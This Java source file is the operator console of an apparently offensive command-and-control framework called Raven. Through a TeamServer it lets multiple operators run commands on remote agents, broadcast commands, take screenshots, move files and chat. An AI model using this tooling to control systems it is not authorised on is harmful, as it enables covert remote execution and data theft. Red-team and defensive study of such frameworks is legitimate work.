package com.raven.iface;

import com.google.gson.*;
import com.raven.core.output.Logger;
import com.raven.utils.AnsiColor;
import com.raven.utils.ServerConfig;
import java.io.*;
import java.net.*;
import java.net.http.*;
import java.time.*;
import java.time.format.DateTimeFormatter;
import java.util.*;

public final class TeamClient {

    private final ServerConfig Config;
    private final String TsHost;
    private final int TsPort;
    private final HttpClient Http;
    private final Gson Json = new Gson();

    private String Token = null;
    private String OperatorName = null;
    private String OperatorRole = null;
    private volatile boolean Running = true;

    private static final DateTimeFormatter TimeFmt = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
    private static final String I = "    ";

    public TeamClient(ServerConfig Config, String TsHost, int TsPort) {
        this.Config = Config;
        this.TsHost = TsHost;
        this.TsPort = TsPort;
        this.Http = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(5)).build();
    }

    private String Base() {
        return "http://" + TsHost + ":" + TsPort;
    }

    private Map<String, Object> Post(String Path, Map<String, Object> Body) throws Exception {
        String BodyStr = Json.toJson(Body != null ? Body : new HashMap<>());
        HttpRequest.Builder Req = HttpRequest.newBuilder()
            .uri(URI.create(Base() + Path))
            .header("Content-Type", "application/json")
            .POST(HttpRequest.BodyPublishers.ofString(BodyStr));
        if (Token != null) Req.header("Authorization", "Bearer " + Token);
        HttpResponse<String> Resp = Http.send(Req.build(), HttpResponse.BodyHandlers.ofString());
        @SuppressWarnings("unchecked")
        Map<String, Object> R = Json.fromJson(Resp.body(), Map.class);
        return R != null ? R : new HashMap<>();
    }

    private Map<String, Object> Get(String Path) throws Exception {
        HttpRequest.Builder Req = HttpRequest.newBuilder()
            .uri(URI.create(Base() + Path))
            .header("Content-Type", "application/json")
            .GET();
        if (Token != null) Req.header("Authorization", "Bearer " + Token);
        HttpResponse<String> Resp = Http.send(Req.build(), HttpResponse.BodyHandlers.ofString());
        @SuppressWarnings("unchecked")
        Map<String, Object> R = Json.fromJson(Resp.body(), Map.class);
        return R != null ? R : new HashMap<>();
    }

    private boolean Login() {
        System.out.println();
        System.out.println(Box("TEAMCLIENT — CONNECT TO TEAMSERVER"));
        System.out.println();
        System.out.printf(I + "%sTeamServer: %s%s:%d%s%n", AnsiColor.Red, AnsiColor.White, TsHost, TsPort, AnsiColor.Reset);
        System.out.println();

        try {
            Map<String, Object> Probe = Post("/api/auth/login", new HashMap<>());
            if (Probe.containsKey("Error")) {
                String ErrMsg = Probe.get("Error").toString();
                if (!ErrMsg.toLowerCase().contains("credential") && !ErrMsg.toLowerCase().contains("required") && !ErrMsg.isEmpty()) {
                    System.out.printf(I + "%s✘ TeamServer rejected probe: %s%s%n", AnsiColor.Red, ErrMsg, AnsiColor.Reset);
                    return false;
                }
            }
        } catch (java.net.ConnectException E) {
            System.out.printf(I + "%s✘ Connection refused — %s:%d%s%n", AnsiColor.Red, TsHost, TsPort, AnsiColor.Reset);
            System.out.println();
            System.out.println(I + "TeamClient requires a running TeamServer Web (-TSW), not TeamServer CLI (-TSC).");
            System.out.println(I + "Start the server first:");
            System.out.println();
            System.out.printf(I + "  %s# Operator 1 (primary — starts server + web panel)%s%n", AnsiColor.White, AnsiColor.Reset);
            System.out.printf(I + "  java -jar raven.jar -TSW -p 4444 -tp %d%n%n", TsPort);
            System.out.printf(I + "  %s# Operator 2+ (connect to running server)%s%n", AnsiColor.White, AnsiColor.Reset);
            System.out.printf(I + "  java -jar raven.jar -TC -ts %s -tp %d%n%n", TsHost, TsPort);
            return false;
        } catch (Exception E) {
            String Msg = E.getMessage() != null ? E.getMessage() : E.getClass().getSimpleName();
            System.out.printf(I + "%s✘ TeamServer unreachable: %s%s%n%n", AnsiColor.Red, Msg, AnsiColor.Reset);
            System.out.println(I + "Ensure TeamServer is running with -TSW flag.");
            return false;
        }

        BufferedReader Reader = new BufferedReader(new InputStreamReader(System.in));
        for (int Try = 0; Try < 3; Try++) {
            try {
                System.out.printf(I + "%sUsername: %s", AnsiColor.White, AnsiColor.Reset);
                String User = Reader.readLine();
                if (User == null || User.isBlank()) return false;
                System.out.printf(I + "%sPassword: %s", AnsiColor.White, AnsiColor.Reset);
                String Pass = Reader.readLine();
                if (Pass == null) return false;

                Map<String, Object> Body = new LinkedHashMap<>();
                Body.put("Username", User.trim());
                Body.put("Password", Pass.trim());
                Map<String, Object> Resp = Post("/api/auth/login", Body);

                if (Resp.containsKey("Error")) {
                    System.out.printf(I + "%s✘ %s%s%n", AnsiColor.Red, Resp.get("Error"), AnsiColor.Reset);
                    continue;
                }
                Token = Resp.getOrDefault("Token", "").toString();
                OperatorName = Resp.getOrDefault("Username", User.trim()).toString();
                OperatorRole = Resp.getOrDefault("Role", "MEMBER").toString();

                System.out.printf("%n" + I + "%s✔ Welcome, %s [%s]%s%n", AnsiColor.Green, OperatorName, OperatorRole, AnsiColor.Reset);
                System.out.printf(I + "%sConnected to TeamServer at %s:%d%s%n%n", AnsiColor.White, TsHost, TsPort, AnsiColor.Reset);
                return true;
            } catch (Exception E) {
                System.out.printf(I + "%s✘ Error: %s%s%n", AnsiColor.Red, E.getMessage(), AnsiColor.Reset);
            }
        }
        return false;
    }

    public void Run() {
        if (!Login()) return;
        Prompt();
        BufferedReader Reader = new BufferedReader(new InputStreamReader(System.in));
        while (Running) {
            try {
                System.out.print(AnsiColor.Red + "┌──(RAVEN-CLIENT)" + AnsiColor.Reset + "\n" + AnsiColor.Red + "└─>> " + AnsiColor.Reset);
                String Line = Reader.readLine();
                if (Line == null) break;
                Line = Line.trim();
                if (Line.isEmpty()) continue;
                String[] Parts = Line.split("\\s+");
                String Cmd = Parts[0].toLowerCase();
                switch (Cmd) {
                    case "sessions", "agents" -> ShowSessions();
                    case "exec" -> CmdExec(Parts, Line);
                    case "broadcast" -> CmdBroadcast(Parts, Line);
                    case "kill" -> CmdKill(Parts);
                    case "sysinfo", "info" -> CmdSysinfo(Parts);
                    case "whoami" -> CmdExecSimple(Parts, "whoami");
                    case "sleep" -> CmdSleep(Parts);
                    case "screenshot" -> CmdScreenshot(Parts);
                    case "download" -> CmdDownload(Parts);
                    case "upload" -> CmdUpload(Parts);
                    case "note" -> CmdNote(Parts);
                    case "getnote" -> CmdGetNote(Parts);
                    case "history" -> CmdHistory(Parts);
                    case "listopt" -> CmdListOperators();
                    case "chat" -> CmdChat();
                    case "chathistory" -> CmdChatHistory();
                    case "ch" -> CmdChatSend(Parts, Line, false);
                    case "gc" -> CmdChatSend(Parts, Line, true);
                    case "status" -> CmdStatus();
                    case "logs" -> CmdLogs();
                    case "help" -> Prompt();
                    case "clear" -> System.out.print("\033[H\033[2J");
                    case "exit", "quit" -> {
                        Running = false;
                        try {
                            Post("/api/auth/logout", null);
                        } catch (Exception Ign) {}
                        System.out.printf(I + "%s⏻ Disconnected from TeamServer%s%n%n", AnsiColor.White, AnsiColor.Reset);
                    }
                    default -> System.out.printf(I + "%s✘ Unknown: %s — type 'help'%s%n", AnsiColor.Red, Cmd, AnsiColor.Reset);
                }
            } catch (IOException E) {
                break;
            }
        }
        System.exit(0);
    }

    private void ShowSessions() {
        try {
            Map<String, Object> R = Get("/api/agents");
            @SuppressWarnings("unchecked")
            List<Map<String, Object>> Agents = (List<Map<String, Object>>) R.getOrDefault("Agents", new ArrayList<>());
            System.out.println();
            System.out.println(Box("ACTIVE SESSIONS"));
            System.out.println();
            if (Agents.isEmpty()) {
                System.out.println(I + "  No active sessions\n");
                return;
            }
            System.out.printf(I + "%s%-5s %-14s %-14s %-16s %-10s %-10s %s%s%n", AnsiColor.Red, "ID", "NAME/CERT", "TYPE", "IP", "OS", "USER", "SESSION-KEY", AnsiColor.Reset);
            System.out.println(I + "─".repeat(95));
            for (Map<String, Object> A : Agents) {
                System.out.printf(I + "%s#%-4s %-14s %-14s %-16s %-10s %-10s %s%s%n", AnsiColor.White, A.getOrDefault("ID", "?"), truncate(A.getOrDefault("AgentName", "?").toString().toUpperCase(), 13), A.getOrDefault("Type", "?"), A.getOrDefault("AgentIP", "?"), truncate(A.getOrDefault("OS", "?").toString(), 9), truncate(A.getOrDefault("User", "?").toString(), 9), A.getOrDefault("SessionKey", "—"), AnsiColor.Reset);
            }
            System.out.println();
        } catch (Exception E) {
            Err(E);
        }
    }

    private void CmdExec(String[] Parts, String Line) {
        if (Parts.length < 3) {
            Warn("Usage: exec <id> <cmd>");
            return;
        }
        try {
            int Id = Integer.parseInt(Parts[1]);
            String Cmd = Line.substring(Line.indexOf(Parts[2]));
            Map<String, Object> Body = new LinkedHashMap<>();
            Body.put("AgentId", Id);
            Body.put("Command", Cmd);
            Body.put("Operator", OperatorName);
            Map<String, Object> R = Post("/api/command/execute", Body);
            boolean Ok = Boolean.parseBoolean(R.getOrDefault("Success", "false").toString());
            printOutput(Ok, R.getOrDefault("Output", "").toString());
        } catch (Exception E) {
            Err(E);
        }
    }

    private void CmdBroadcast(String[] Parts, String Line) {
        if (Parts.length < 3) {
            Warn("Usage: broadcast <all|id1,id2,...> <cmd>");
            return;
        }
        try {
            String Target = Parts[1].toLowerCase();
            String Cmd = Line.substring(Line.indexOf(Parts[2]));
            Map<String, Object> Body = new LinkedHashMap<>();
            Body.put("Command", Cmd);
            Body.put("Operator", OperatorName);
            Map<String, Object> R;
            if (Target.equals("all")) {
                R = Post("/api/command/broadcastall", Body);
            } else {
                List<Integer> Ids = new ArrayList<>();
                for (String S : Target.split(",")) {
                    try {
                        Ids.add(Integer.parseInt(S.trim()));
                    } catch (Exception Ign) {}
                }
                Body.put("AgentIds", Ids);
                R = Post("/api/command/broadcast", Body);
            }
            @SuppressWarnings("unchecked")
            Map<String, Object> Results = (Map<String, Object>) R.getOrDefault("Results", new HashMap<>());
            Results.forEach((Id, V) -> {
                @SuppressWarnings("unchecked")
                Map<String, Object> Res = (Map<String, Object>) V;
                boolean Ok = Boolean.parseBoolean(Res.getOrDefault("Success", "false").toString());
                System.out.printf(I + "%s[%s] %s%s%s%n", Ok ? AnsiColor.Green : AnsiColor.Red, Id, Ok ? "✔ " : "✘ ", Res.getOrDefault("Output", ""), AnsiColor.Reset);
            });
        } catch (Exception E) {
            Err(E);
        }
    }

    private void CmdKill(String[] Parts) {
        if (Parts.length < 2) {
            Warn("Usage: kill <id>");
            return;
        }
        try {
            Map<String, Object> Body = new LinkedHashMap<>();
            Body.put("AgentId", Integer.parseInt(Parts[1]));
            Map<String, Object> R = Post("/api/agents/kill", Body);
            boolean Ok = Boolean.parseBoolean(R.getOrDefault("Success", "false").toString());
            if (Ok) Ok("Session-" + Parts[1] + " terminated");
            else Err("Kill failed: " + R.getOrDefault("Error", "?"));
        } catch (Exception E) {
            Err(E);
        }
    }

    private void CmdSysinfo(String[] Parts) {
        if (Parts.length < 2) {
            Warn("Usage: sysinfo <id>");
            return;
        }
        try {
            Map<String, Object> R = Get("/api/agents");
            @SuppressWarnings("unchecked")
            List<Map<String, Object>> Agents = (List<Map<String, Object>>) R.getOrDefault("Agents", new ArrayList<>());
            int Id = Integer.parseInt(Parts[1]);
            Map<String, Object> A = Agents.stream()
                .filter(X -> Integer.parseInt(X.getOrDefault("ID", "-1").toString()) == Id)
                .findFirst()
                .orElse(null);
            if (A == null) {
                Warn("Session not found");
                return;
            }
            System.out.println(Box("SESSION INFO — #" + Id));
            System.out.println();
            A.forEach((K, V) -> System.out.printf(I + "%s%-12s%s %s%n", AnsiColor.Red, K, AnsiColor.White, V));
            System.out.println();
        } catch (Exception E) {
            Err(E);
        }
    }

    private void CmdExecSimple(String[] Parts, String Cmd) {
        if (Parts.length < 2) {
            Warn("Usage: " + Cmd + " <id>");
            return;
        }
        String[] P = new String[] { Cmd, Parts[1], Cmd };
        CmdExec(P, Cmd + " " + Parts[1] + " " + Cmd);
    }

    private void CmdSleep(String[] Parts) {
        if (Parts.length < 3) {
            Warn("Usage: sleep <id> <seconds>");
            return;
        }
        CmdExec(new String[] { "exec", Parts[1], "sleep " + Parts[2] }, "exec " + Parts[1] + " sleep " + Parts[2]);
    }

    private void CmdScreenshot(String[] Parts) {
        if (Parts.length < 2) {
            Warn("Usage: screenshot <id>");
            return;
        }
        try {
            Map<String, Object> Body = Map.of("AgentId", Integer.parseInt(Parts[1]), "Operator", OperatorName);
            Map<String, Object> R = Post("/api/command/screenshot", Body);
            boolean Ok = Boolean.parseBoolean(R.getOrDefault("Success", "false").toString());
            printOutput(Ok, R.getOrDefault("Output", "").toString());
        } catch (Exception E) {
            Err(E);
        }
    }

    private void CmdDownload(String[] Parts) {
        if (Parts.length < 3) {
            Warn("Usage: download <id> <remote-path>");
            return;
        }
        try {
            Map<String, Object> Body = Map.of("AgentId", Integer.parseInt(Parts[1]), "Path", Parts[2], "Operator", OperatorName);
            Map<String, Object> R = Post("/api/command/download", Body);
            boolean Ok = Boolean.parseBoolean(R.getOrDefault("Success", "false").toString());
            printOutput(Ok, R.getOrDefault("Output", "").toString());
        } catch (Exception E) {
            Err(E);
        }
    }

    private void CmdUpload(String[] Parts) {
        if (Parts.length < 3) {
            Warn("Usage: upload <id> <local-path> [remote-path]");
            return;
        }
        try {
            Map<String, Object> Body = new LinkedHashMap<>();
            Body.put("AgentId", Integer.parseInt(Parts[1]));
            Body.put("LocalPath", Parts[2]);
            Body.put("RemotePath", Parts.length > 3 ? Parts[3] : "");
            Body.put("Operator", OperatorName);
            Map<String, Object> R = Post("/api/command/upload", Body);
            boolean Ok = Boolean.parseBoolean(R.getOrDefault("Success", "false").toString());
            printOutput(Ok, R.getOrDefault("Output", "").toString());
        } catch (Exception E) {
            Err(E);
        }
    }

    private void CmdNote(String[] Parts) {
        if (Parts.length < 3) {
            Warn("Usage: note <id> <text>");
            return;
        }
        try {
            String Note = String.join(" ", Arrays.copyOfRange(Parts, 2, Parts.length));
            Map<String, Object> R = Post("/api/agents/note", Map.of("AgentId", Integer.parseInt(Parts[1]), "Note", Note));
            if (Boolean.parseBoolean(R.getOrDefault("Success", "false").toString())) Ok("Note saved for Session-" + Parts[1]);
        } catch (Exception E) {
            Err(E);
        }
    }

    private void CmdGetNote(String[] Parts) {
        if (Parts.length < 2) {
            Warn("Usage: getnote <id>");
            return;
        }
        try {
            Map<String, Object> R = Get("/api/agents");
            @SuppressWarnings("unchecked")
            List<Map<String, Object>> Agents = (List<Map<String, Object>>) R.getOrDefault("Agents", new ArrayList<>());
            int Id = Integer.parseInt(Parts[1]);
            Optional<Map<String, Object>> A = Agents.stream()
                .filter(X -> Integer.parseInt(X.getOrDefault("ID", "-1").toString()) == Id)
                .findFirst();
            System.out.printf(I + "Note [%d]: %s%s%s%n", Id, AnsiColor.White, A.map(X -> X.getOrDefault("Note", "(none)").toString()).orElse("(session not found)"), AnsiColor.Reset);
        } catch (Exception E) {
            Err(E);
        }
    }

    private void CmdHistory(String[] Parts) {
        try {
            int Id = Parts.length > 1 ? Integer.parseInt(Parts[1]) : 0;
            int Lim = Parts.length > 2 ? Integer.parseInt(Parts[2]) : 50;
            Map<String, Object> Body = Map.of("AgentId", Id, "Limit", Lim);
            Map<String, Object> R = Post("/api/command/history", Body);
            @SuppressWarnings("unchecked")
            List<Map<String, Object>> Hist = (List<Map<String, Object>>) R.getOrDefault("History", new ArrayList<>());
            System.out.println(Box("COMMAND HISTORY (last " + Lim + ")"));
            System.out.println();
            if (Hist.isEmpty()) {
                System.out.println(I + " No history\n");
                return;
            }
            System.out.printf(I + "%s%-5s %-12s %-14s %-36s %s%s%n", AnsiColor.Red, "SID", "OPERATOR", "STATUS", "COMMAND", "TIMESTAMP", AnsiColor.Reset);
            System.out.println(I + "─".repeat(80));
            for (Map<String, Object> H : Hist) {
                boolean Ok = Boolean.parseBoolean(H.getOrDefault("Success", "false").toString());
                String Cmd = H.getOrDefault("Command", "").toString();
                if (Cmd.length() > 36) Cmd = Cmd.substring(0, 35) + "…";
                System.out.printf(I + "%s%-5s %-12s %s%-14s%s %-36s %s%s%n", AnsiColor.White, H.getOrDefault("AgentId", "?"), H.getOrDefault("Operator", "?"), Ok ? AnsiColor.Green : AnsiColor.Red, Ok ? "✔ ok" : "✘ fail", AnsiColor.White, Cmd, H.getOrDefault("Timestamp", ""), AnsiColor.Reset);
            }
            System.out.println();
        } catch (Exception E) {
            Err(E);
        }
    }

    private void CmdListOperators() {
        try {
            Map<String, Object> R = Get("/api/team/operators");
            @SuppressWarnings("unchecked")
            List<Map<String, Object>> Ops = (List<Map<String, Object>>) R.getOrDefault("Operators", new ArrayList<>());
            System.out.println(Box("OPERATORS (" + Ops.size() + ")"));
            System.out.println();
            System.out.printf(I + "%s%-18s %-10s %-24s %-20s%s%n", AnsiColor.Red, "USERNAME", "ROLE", "PERMISSIONS", "LAST SEEN", AnsiColor.Reset);
            System.out.println(I + "─".repeat(75));
            for (Map<String, Object> Op : Ops) {
                String Role = Op.getOrDefault("Role", "MEMBER").toString();
                String Perm = com.raven.core.db.TeamDatabase.OperatorRole.FromString(Role).PermissionString().replaceAll("^\\[.*?\\]\\s*", "");
                String Mark = Op.getOrDefault("Username", "").toString().equals(OperatorName) ? " ◀ YOU" : "";
                System.out.printf(I + "%s%-18s %-10s %-24s %-20s%s%s%n", AnsiColor.White, Op.getOrDefault("Username", "?"), Role, "[" + com.raven.core.db.TeamDatabase.OperatorRole.FromString(Role).ShortPerm() + "] " + Perm, Op.getOrDefault("LastSeen", "Never"), Mark, AnsiColor.Reset);
            }
            System.out.println();
        } catch (Exception E) {
            Err(E);
        }
    }

    private void CmdChat() {
        try {
            Map<String, Object> R = Post("/api/team/chat/messages", null);
            @SuppressWarnings("unchecked")
            List<Map<String, Object>> Msgs = (List<Map<String, Object>>) R.getOrDefault("Messages", new ArrayList<>());
            System.out.println(Box("CHAT MESSAGES"));
            System.out.println();
            if (Msgs.isEmpty()) {
                System.out.println(I + "⚠ No messages\n");
                return;
            }
            for (Map<String, Object> M : Msgs) {
                String From = M.getOrDefault("From", "?").toString();
                String To = M.getOrDefault("To", "all").toString();
                boolean Mine = From.equals(OperatorName);
                System.out.printf(I + "%s[%s] %s%s%s [%s]: %s%s%n", Mine ? AnsiColor.Green : AnsiColor.White, M.getOrDefault("Time", ""), Mine ? AnsiColor.Green : AnsiColor.Red, From, AnsiColor.Reset, To.equals("all") ? "all" : "→ " + To, M.getOrDefault("Message", ""), AnsiColor.Reset);
            }
            System.out.println();
        } catch (Exception E) {
            Err(E);
        }
    }

    private void CmdChatHistory() {
        try {
            Map<String, Object> R = Post("/api/team/chat/logs", Map.of("Limit", 100));
            @SuppressWarnings("unchecked")
            List<Map<String, Object>> Logs = (List<Map<String, Object>>) R.getOrDefault("Logs", new ArrayList<>());
            System.out.println(Box("CHAT HISTORY (DB — last 100)"));
            System.out.println();
            if (Logs.isEmpty()) {
                System.out.println(I + "⚠ No chat history\n");
                return;
            }
            List<Map<String, Object>> Rev = new ArrayList<>(Logs);
            Collections.reverse(Rev);
            for (Map<String, Object> M : Rev) {
                String From = M.getOrDefault("from_operator", "?").toString();
                String To = M.getOrDefault("to_operators", "all").toString();
                String Ts = M.getOrDefault("timestamp", "").toString();
                if (Ts.length() > 19) Ts = Ts.substring(11, 19);
                boolean Mine = From.equals(OperatorName);
                System.out.printf(I + "%s[%s] %s%s%s [%s]: %s%s%n", Mine ? AnsiColor.Green : AnsiColor.White, Ts, Mine ? AnsiColor.Green : AnsiColor.Red, From, AnsiColor.Reset, To.equals("all") ? "all" : "→ " + To, M.getOrDefault("message", ""), AnsiColor.Reset);
            }
            System.out.println();
        } catch (Exception E) {
            Err(E);
        }
    }

    private void CmdChatSend(String[] Parts, String Line, boolean Global) {
        if (Global) {
            if (Parts.length < 3) {
                Warn("Usage: gc all <message>");
                return;
            }
            String Msg = Line.substring(Line.indexOf(Parts[2]));
            try {
                Post("/api/team/chat/send", Map.of("To", "all", "Message", Msg));
                Ok("Broadcast: " + Msg);
            } catch (Exception E) {
                Err(E);
            }
        } else {
            if (Parts.length < 3) {
                Warn("Usage: ch <name> <message>");
                return;
            }
            String To = Parts[1];
            String Msg = Line.substring(Line.indexOf(Parts[2]));
            try {
                Post("/api/team/chat/send", Map.of("To", To, "Message", Msg));
                Ok("Sent to " + To + ": " + Msg);
            } catch (Exception E) {
                Err(E);
            }
        }
    }

    private void CmdStatus() {
        try {
            Map<String, Object> R = Get("/api/server/status");
            System.out.println(Box("SERVER STATUS"));
            System.out.println();
            System.out.printf(I + "%sStatus   %s%s%s%n", AnsiColor.Red, AnsiColor.Green, R.getOrDefault("Status", "?"), AnsiColor.Reset);
            System.out.printf(I + "%sMode     %s%s%n", AnsiColor.Red, AnsiColor.White, R.getOrDefault("Mode", "?"));
            System.out.printf(I + "%sAddress  %s%s:%s%n", AnsiColor.Red, AnsiColor.White, R.getOrDefault("Host", "?"), R.getOrDefault("Port", "?"));
            System.out.printf(I + "%sUptime   %s%s%n", AnsiColor.Red, AnsiColor.White, R.getOrDefault("Uptime", "?"));
            System.out.printf(I + "%sSessions %s%s%n", AnsiColor.Red, AnsiColor.White, R.getOrDefault("Agents", 0));
            System.out.printf(I + "%sDB       %s%s (%s)%n", AnsiColor.Red, AnsiColor.White, R.getOrDefault("DbOnline", false).toString().equals("true") ? "Connected" : "Offline", R.getOrDefault("DbType", "?"));
            System.out.printf(I + "%sServer   %shttp://%s:%d%s%n%n", AnsiColor.Red, AnsiColor.White, TsHost, TsPort, AnsiColor.Reset);
        } catch (Exception E) {
            Err(E);
        }
    }

    private void CmdLogs() {
        try {
            Map<String, Object> R = Get("/api/logs");
            @SuppressWarnings("unchecked")
            List<String> Logs = (List<String>) R.getOrDefault("Logs", new ArrayList<>());
            System.out.println(Box("RECENT LOGS"));
            System.out.println();
            Logs.stream()
                .skip(Math.max(0, Logs.size() - 30))
                .forEach(L -> System.out.println(I + AnsiColor.White + L + AnsiColor.Reset));
            System.out.println();
        } catch (Exception E) {
            Err(E);
        }
    }

    private void Prompt() {
        String R = AnsiColor.Red,
            W = AnsiColor.White,
            X = AnsiColor.Reset,
            NL = "\n";
        System.out.println(NL + I + W + "SESSION COMMANDS" + X);
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "sessions / agents", "List active sessions");
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "exec <id> <cmd>", "Execute command");
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "broadcast <all|ids> <cmd>", "Broadcast command");
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "kill <id>", "Terminate session");
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "sysinfo <id>", "Full session info");
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "whoami <id>", "Run whoami");
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "sleep <id> <secs>", "Set sleep interval");
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "screenshot <id>", "Request screenshot");
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "download <id> <path>", "Download file");
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "upload <id> <local> [remote]", "Upload file");
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "note <id> <text>", "Set session note");
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "getnote <id>", "Get session note");
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "history [id] [limit]", "Command history");
        System.out.println();
        System.out.println(I + W + "TEAM / STATUS" + X);
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "listopt", "List operators");
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "chat", "In-memory chat");
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "chathistory", "Chat history from DB");
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "ch <name> <msg>", "DM an operator");
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "gc all <msg>", "Broadcast chat");
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "status", "Server status");
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "logs", "Recent logs");
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "help", "This help");
        System.out.printf(I + "  " + R + "%-32s" + X + "%s%n", "exit / quit", "Disconnect");
        System.out.println();
        System.out.printf(I + W + "Connected as: %s[%s]%s  TeamServer: %s%s:%d%s%n%n", AnsiColor.Green, OperatorName != null ? OperatorName + " / " + OperatorRole : "—", AnsiColor.White, AnsiColor.Red, TsHost, TsPort, X);
    }

    private String Box(String Title) {
        int W = 95;
        int Pad = (W - 2 - Title.length()) / 2;
        String Line = "─".repeat(W);
        return "\n" + I + "┌" + Line + "┐" + "\n" + I + "│" + " ".repeat(Pad) + Title + " ".repeat(W - Pad - Title.length()) + "│" + "\n" + I + "└" + Line + "┘";
    }

    private void printOutput(boolean Ok, String Out) {
        if (Ok) {
            String Border = "─".repeat(88);
            System.out.println(I + "┌─ Output " + border(79));
            for (String L : Out.split("\n")) System.out.println(I + "│ " + L);
            System.out.println(I + "└" + border(89));
        } else {
            System.out.printf(I + "%s✘ %s%s%n", AnsiColor.Red, Out, AnsiColor.Reset);
        }
        System.out.println();
    }

    private String border(int N) {
        return "─".repeat(N);
    }

    private void Ok(String M) {
        System.out.printf(I + "%s✔ %s%s%n%n", AnsiColor.Green, M, AnsiColor.Reset);
    }

    private void Warn(String M) {
        System.out.printf(I + "%s⚠ %s%s%n", AnsiColor.White, M, AnsiColor.Reset);
    }

    private void Err(Exception E) {
        System.out.printf(I + "%s✘ %s%s%n", AnsiColor.Red, E.getMessage(), AnsiColor.Reset);
    }

    private void Err(String M) {
        System.out.printf(I + "%s✘ %s%s%n", AnsiColor.Red, M, AnsiColor.Reset);
    }

    private static String truncate(String S, int N) {
        return S.length() > N ? S.substring(0, N - 1) + "…" : S;
    }
}
